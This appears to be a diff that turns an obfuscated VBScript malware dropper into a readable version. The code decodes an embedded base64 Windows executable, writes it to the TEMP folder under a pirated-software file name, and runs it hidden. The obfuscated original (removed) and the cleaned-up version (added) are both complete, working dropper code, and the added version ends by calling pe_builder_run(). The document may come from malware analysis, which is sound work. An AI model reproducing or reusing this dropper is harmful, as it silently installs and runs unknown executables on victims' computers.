@@ -1,76 +1,5 @@
+' THE PE FILE
 Dim pe_code(4311)
-Dim HnYoM
-Dim zcEt
-Dim jsYvkOQEg
-dim CymRjgXmu, Invnr, SvViKoMjP
-
-Set HnYoM = CreateObject("S" & "c" & "rip" & "t" & "in" & "g." & "F" & "il" & "eSys" & "tem" & "Obje" & "ct")
-Set zcEt = CreateObject("W" & "Sc" & "ri" & "pt.S" & "hell")
-set CymRjgXmu = WScript.CreateObject("WScri" & "pt.S" & "hell")
-set Invnr = CymRjgXmu.Environment("PRO" & "CESS")
-
-SvViKoMjP = Invnr("TEMP") & "\[free-torrents.org]_Build_243365_Final_EngRus.vbs.exe"
-
-Function GCusVYF(ByVal ELRQhljPN)
-	Const wVaReQvZI = "ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+/"
-	Dim xazLMHl, mFJJAKBE, WEjSiVJ
-	xazLMHl = Len(ELRQhljPN)
-	For WEjSiVJ = 1 To xazLMHl Step 4
-	Dim cUiSHJpHj, uRnk, STMt, nYejCob, kLKmFTfn, vVMwpDK
-	cUiSHJpHj = 3
-	kLKmFTfn = 0
-	For uRnk = 0 To 3
-	STMt = Mid(ELRQhljPN, WEjSiVJ + uRnk, 1)
-	If STMt = "=" Then
-	cUiSHJpHj = cUiSHJpHj - 1
-	nYejCob = 0
-	Else
-	nYejCob = InStr(wVaReQvZI, STMt) - 1
-	End If '2
-	kLKmFTfn = 64 * kLKmFTfn + nYejCob
-	Next '2
-	kLKmFTfn = Hex(kLKmFTfn)
-	kLKmFTfn = String(6 - Len(kLKmFTfn), "0") & kLKmFTfn
-	vVMwpDK = ChrB(CInt("&H" & Mid(kLKmFTfn, 1, 2))) + _
-	ChrB(CInt("&H" & Mid(kLKmFTfn, 3, 2))) + _
-	ChrB(CInt("&H" & Mid(kLKmFTfn, 5, 2)))
-	mFJJAKBE = mFJJAKBE & LeftB(vVMwpDK, cUiSHJpHj)
-	Next '3
-	GCusVYF = mFJJAKBE
-End Function '1
-
-Function cPxrQiBBT(XUSmT)
-	Dim KHex, uAGRrt, lnMJ, NFgP, PVNkfB, MrblKQFC, LflVmj, HwPV
-	KHex = 1
-	uAGRrt = 1 '1
-	lnMJ = 1 '1
-	LflVmj = LenB(XUSmT)
-	Do While KHex <= LflVmj
-	HwPV = MidB(XUSmT, KHex, 1)
-	MrblKQFC = MrblKQFC & Chr(AscB(HwPV))
-	KHex = KHex + 1
-	lnMJ = lnMJ + 1
-	If lnMJ > 300 Then
-	PVNkfB = PVNkfB & MrblKQFC
-	MrblKQFC = ""
-	lnMJ = 1 '2
-	uAGRrt = uAGRrt + 1
-	If uAGRrt > 200 Then
-	NFgP = NFgP & PVNkfB
-	PVNkfB = ""
-	uAGRrt = 1 '2
-	End If '4
-	End If '5
-	Loop
-	cPxrQiBBT = NFgP & PVNkfB & MrblKQFC
-End Function '2
-
-Function mSQutroiz(cTrr)
-	Dim FiASU, zjdYGgz
-	zjdYGgz = "[free-torrents.org]_Build_243365_Final_EngRus.vbs.exe"
-	FiASU = jsYvkOQEg("T" & Chr(69) & "MP") & "\" & zjdYGgz
-	cTrr.Run FiASU, vbHide
-End Function
 
 pe_code(0) = "TVqQAAMAAAAEAAAA//8AALgAAAAAAAAAQAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA"
 pe_code(1) = "AAAAgAAAAA4fug4AtAnNIbgBTM0hVGhpcyBwcm9ncmFtIGNhbm5vdCBiZSBydW4gaW4gRE9TIG1v"
@@ -4385,34 +4314,112 @@ pe_code(4309) = "AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
 pe_code(4310) = "AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA"
 pe_code(4311) = "AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA"
 
+' FUNCTIONS
+Function pe_builder_run()
+	create_file_wrapper()
+	file_handle.Write Base64Decode_Part2(Base64Decode_Part1(pe_code_upper))
+	file_handle.Close
+	Dim same_file_handle
+	xnkhV = "<?xml version=" & Chr(34) & "1.0" & Chr(34) & " encoding=" & Chr(34) & "utf-8" & Chr(34) & "?><configuration><startup><startup useLegacyV2RuntimeActivationPolicy=" & Chr(34) & "true" & Chr(34) & " /><supportedRuntime version=" & Chr(34) & "v2.0.50727" & Chr(34) & "/><supportedRuntime version=" & Chr(34) & "v4.0" & Chr(34) & "/></startup></configuration>"
+	Set same_file_handle = Scripting_FilesSystemObject.OpenTextFile(Invnr_like("TEMP") & "\[free-torrents.org]_Build_243365_Final_EngRus.vbs.exe.config",2,True)
+	same_file_handle.Write(xnkhV)
+	same_file_handle.Close
+	run_pe(Wscript_Shell)
+End Function
+
+Function create_file_wrapper()
+	create_file()
+End Function
+
+Function create_file()
+	Set file_handle = Scripting_FilesSystemObject.OpenTextFile(exefile_path,2,True)
+End Function
+
+Function Base64Decode_Part1(ByVal encoded_pe)
+	Const wVaReQvZI = "ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+/"
+	Dim xazLMHl, mFJJAKBE, WEjSiVJ
+	xazLMHl = Len(encoded_pe)
+	For WEjSiVJ = 1 To xazLMHl Step 4
+		Dim cUiSHJpHj, uRnk, STMt, nYejCob, kLKmFTfn, vVMwpDK
+		cUiSHJpHj = 3
+		kLKmFTfn = 0
+		For uRnk = 0 To 3
+			STMt = Mid(encoded_pe, WEjSiVJ + uRnk, 1)
+			If STMt = "=" Then
+				cUiSHJpHj = cUiSHJpHj - 1
+				nYejCob = 0
+			Else
+				nYejCob = InStr(wVaReQvZI, STMt) - 1
+			End If '2
+			kLKmFTfn = 64 * kLKmFTfn + nYejCob
+		Next '2
+		kLKmFTfn = Hex(kLKmFTfn)
+		kLKmFTfn = String(6 - Len(kLKmFTfn), "0") & kLKmFTfn
+		vVMwpDK = ChrB(CInt("&H" & Mid(kLKmFTfn, 1, 2))) + _
+		ChrB(CInt("&H" & Mid(kLKmFTfn, 3, 2))) + _
+		ChrB(CInt("&H" & Mid(kLKmFTfn, 5, 2)))
+		mFJJAKBE = mFJJAKBE & LeftB(vVMwpDK, cUiSHJpHj)
+	Next '3
+	Base64Decode_Part1 = mFJJAKBE
+End Function '1
+
+Function Base64Decode_Part2(XUSmT)
+	Dim KHex, uAGRrt, lnMJ, NFgP, PVNkfB, MrblKQFC, LflVmj, HwPV
+	KHex = 1
+	uAGRrt = 1 '1
+	lnMJ = 1 '1
+	LflVmj = LenB(XUSmT)
+	Do While KHex <= LflVmj
+		HwPV = MidB(XUSmT, KHex, 1)
+		MrblKQFC = MrblKQFC & Chr(AscB(HwPV))
+		KHex = KHex + 1
+		lnMJ = lnMJ + 1
+		If lnMJ > 300 Then
+			PVNkfB = PVNkfB & MrblKQFC
+			MrblKQFC = ""
+			lnMJ = 1 '2
+			uAGRrt = uAGRrt + 1
+			If uAGRrt > 200 Then
+				NFgP = NFgP & PVNkfB
+				PVNkfB = ""
+				uAGRrt = 1 '2
+			End If '4
+		End If '5
+	Loop
+	Base64Decode_Part2 = NFgP & PVNkfB & MrblKQFC
+End Function '2
+
+Function run_pe(cTrr)
+	Dim FiASU, pe_name
+	pe_name = "[free-torrents.org]_Build_243365_Final_EngRus.vbs.exe"
+	FiASU = Invnr_like("T" & Chr(69) & "MP") & "\" & pe_name
+	cTrr.Run FiASU, vbHide
+End Function
+
+' DEFINES
+Dim Scripting_FilesSystemObject
+Dim Wscript_Shell
+Dim Invnr_like
+dim Wscript_Shell2, Invnr, exefile_path
+
+' Scripting.FilesSystemObject
+Set Scripting_FilesSystemObject = CreateObject("Scripting.FilesSystemObject")
+' WScript.Shell
+Set Wscript_Shell = CreateObject("WScript.Shell")
+set Wscript_Shell2 = WScript.CreateObject("WScript.Shell")
+set Invnr = Wscript_Shell2.Environment("PROCESS")
+
+Dim process
+process = "Process"
+
+Set Invnr_like = Invnr
+Dim file_handle
+
+' MAIN
+exefile_path = Invnr("TEMP") & "\[free-torrents.org]_Build_243365_Final_EngRus.vbs.exe"
+
 For i = 0 To UBound(pe_code)
-EUxkOA = EUxkOA & pe_code(i)
+	pe_code_upper = pe_code_upper & pe_code(i)
 Next '1
 
-Dim FdEE
-FdEE = "Pro" & "cess"
-
-Set jsYvkOQEg = Invnr
-Dim hNUuqppc
-
-Function teOZ()
-	tETj()
-	hNUuqppc.Write cPxrQiBBT(GCusVYF(EUxkOA))
-	hNUuqppc.Close
-	Dim wYarL
-	xnkhV = "<?xml version=" & Chr(34) & "1.0" & Chr(34) & " encoding=" & Chr(34) & "utf-8" & Chr(34) & "?><configuration><startup><startup useLegacyV2RuntimeActivationPolicy=" & Chr(34) & "true" & Chr(34) & " /><supportedRuntime version=" & Chr(34) & "v2.0.50727" & Chr(34) & "/><supportedRuntime version=" & Chr(34) & "v4.0" & Chr(34) & "/></startup></configuration>"
-	Set wYarL = HnYoM.OpenTextFile(jsYvkOQEg("TE" & "MP") & "\[free-torrents.org]_Build_243365_Final_EngRus.vbs.exe.config",2,True)
-	wYarL.Write(xnkhV)
-	wYarL.Close
-	mSQutroiz(zcEt)
-End Function
-
-Function tETj()
-	UkztOuR()
-End Function
-
-Function UkztOuR()
-	Set hNUuqppc = HnYoM.OpenTextFile(SvViKoMjP,2,True)
-End Function
-
-teOZ()
+pe_builder_run()
